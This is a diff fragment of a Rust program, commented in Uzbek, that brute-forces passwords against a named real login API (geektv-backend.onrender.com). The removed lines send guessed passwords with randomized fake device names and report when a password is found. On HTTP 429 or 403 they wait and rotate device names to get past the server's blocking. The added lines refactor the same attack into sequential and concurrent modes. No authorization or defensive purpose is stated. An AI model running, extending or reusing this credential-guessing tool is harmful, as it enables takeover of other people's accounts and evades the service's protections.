-        *tried += 1;
-        let current_try = *tried;
-
-        // Har 100 urinishda progress haqida xabar berish
-        if current_try % 100 == 0 {
-            println!(
-                "{} ta parol sinandi. Hozirgi parol: {}",
-                current_try, password
-            );
-        }
-
-        // Random device name tanlash
-        let device = FAKE_DEVICES
-            .choose(&mut thread_rng())
-            .unwrap_or(&FAKE_DEVICES[0]);
-
-        // API ga so'rov yuborish
-        let payload = serde_json::json!({
-            "device": device,
-            "loginInput": username,
-            "password": password
-        });
-
-        let response = client
-            .post("https://geektv-backend.onrender.com/api/login")
-            .json(&payload)
-            .send()
-            .await;
-
-        match response {
-            Ok(resp) => {
-                let status = resp.status();
-                let response_text = resp
-                    .text()
-                    .await
-                    .unwrap_or_else(|_| "Javob matnini o'qib bo'lmadi".to_string());
-
-                // Response ni JSON formatida parse qilish
-                let json_response: Result<Value, _> = serde_json::from_str(&response_text);
-
-                if status.is_success() {
-                    let message = format!(
-                        "PAROL TOPILDI! Urinish {}: Foydalanuvchi: {} | Parol: {} | Response: {}",
-                        current_try, username, password, response_text
-                    );
-                    log_message(&log_file, &message, true);
-                    *found.lock().unwrap() = true;
-                    break;
-                } else if status == 400 {
-                    // Foydalanuvchi topilmadi xabarini tekshirish
-                    if let Ok(json) = json_response {
-                        if let Some(message) = json.get("message") {
-                            if message == "Foydalanuvchi topilmadi" {
-                                let log_msg = format!("FOYDALANUVCHI TOPILMADI! Urinish {}: Foydalanuvchi: {} | Response: {}", 
-                                                     current_try, username, response_text);
-                                log_message(&log_file, &log_msg, true);
-                                println!("Foydalanuvchi topilmadi. Dastur to'xtatildi.");
-                                *user_not_found.lock().unwrap() = true;
-                                break;
-                            }
-                        }
-                    }
-                    // Boshqa 400 xatolari uchun log yozmaymiz
-                } else if status == 429 || status == 403 {
-                    // Server bloklagan (Too Many Requests yoki Forbidden)
-                    let message = format!(
-                        "SERVER BLOKLADI! Urinish {}: Status: {} | Device: {} | Response: {}",
-                        current_try, status, device, response_text
-                    );
-                    log_message(&log_file, &message, true);
-                    println!(
-                        "Server blokladi! Status: {}. 1 daqiqa kutamiz va device ni o'zgartiramiz.",
-                        status
-                    );
-
-                    // 1 daqiqa kutish
-                    sleep(Duration::from_secs(60)).await;
-
-                    // Device nomini o'zgartirish
-                    log_message(
-                        &log_file,
-                        "Device nomi o'zgartirildi, qayta urinish.",
-                        false,
-                    );
-                    continue;
-                }
-                // Boshqa xatoliklar uchun log yozmaymiz
-            }
-            Err(e) => {
-                // Tarmoq xatolari yoki timeout
-                if e.is_timeout() || e.is_connect() {
-                    let message = format!(
-                        "NETWORK XATOSI! Urinish {}: Xatolik: {} | Device: {}",
-                        current_try, e, device
-                    );
-                    log_message(&log_file, &message, true);
-                    println!(
-                        "Tarmoq xatosi: {}. 1 daqiqa kutamiz va device ni o'zgartiramiz.",
-                        e
-                    );
-
-                    // 1 daqiqa kutish
-                    sleep(Duration::from_secs(60)).await;
-
-                    // Device nomini o'zgartirish
-                    log_message(
-                        &log_file,
-                        "Device nomi o'zgartirildi, qayta urinish.",
-                        false,
-                    );
-                    continue;
-                }
-                // Boshqa xatoliklar uchun log yozmaymiz
-            }
-        }
-
-        // Serverga ortiqcha yuk bo'lmasligi uchun kichik tanaffus
-        sleep(Duration::from_millis(50)).await;
-    }
-
-    if *found.lock().unwrap() {
-        log_message(
-            &log_file,
-            "Dastur muvaffaqiyatli yakunlandi - parol topildi!",
-            true,
-        );
-    } else if *user_not_found.lock().unwrap() {
-        log_message(
-            &log_file,
-            "Dastur to'xtatildi - foydalanuvchi topilmadi!",
-            true,
-        );
-    } else if *blocked.lock().unwrap() {
-        log_message(
-            &log_file,
-            "Dastur server tomonidan bloklanganligi sababli to'xtatildi!",
-            true,
-        );
+    // Tanlangan usulda ishlash
+    if mode == "2" {
+        run_async(
+            client,
+            username,
+            password_generator,
+            found.clone(),
+            blocked.clone(),
+            user_not_found.clone(),
+            concurrent_requests,
+            log_file.clone(),
+        )
+        .await?;
     } else {
-        log_message(&log_file, "Parol topilmadi. Boshqa uzunlikdagi parollarni sinab ko'ring yoki boshqa foydalanuvchi nomini ishlating.", true);
+        run_sync(
+            client,
+            username,
+            password_generator,
+            found.clone(),
+            blocked.clone(),
+            user_not_found.clone(),
+            log_file.clone(),
+        )
+        .await?;
+    }
+
+    if found.load(Ordering::Relaxed) {
+        println!("Dastur muvaffaqiyatli yakunlandi - parol topildi!");
+    } else if user_not_found.load(Ordering::Relaxed) {
+        println!("Dastur to'xtatildi - foydalanuvchi topilmadi!");
+    } else if blocked.load(Ordering::Relaxed) {
+        println!("Dastur server tomonidan bloklanganligi sababli to'xtatildi!");
+    } else {
+        println!("Parol topilmadi. Boshqa uzunlikdagi parollarni sinab ko'ring yoki boshqa foydalanuvchi nomini ishlating.");
     }
 
     Ok(())
